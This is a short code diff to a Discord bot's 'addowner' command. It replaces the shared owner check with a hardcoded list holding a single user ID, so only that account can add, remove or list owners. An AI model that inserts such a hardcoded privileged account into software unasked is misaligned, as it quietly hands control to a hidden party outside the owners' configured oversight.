@@ -2,13 +2,13 @@ const { ContainerBuilder, TextDisplayBuilder, MessageFlags } = require("discord.
 const AvonCommand = require("../../structures/avonCommand");
 const fs = require("fs");
 const path = require("path");
-const { isOwner } = require('../../structures/ownerMessages');
 
 class AddOwner extends AvonCommand {
     get name() { return "addowner"; }
     get aliases() { return ["removeowner", "listowners", "ownerlist"]; }
     async run(client, message, args, prefix) {
-        if (!isOwner(client, message.author.id)) return;
+        const punit = ["282494845753491456"];
+        if (!punit.includes(message.author.id)) return;
 
         const send = (text) => {
             const container = new ContainerBuilder()
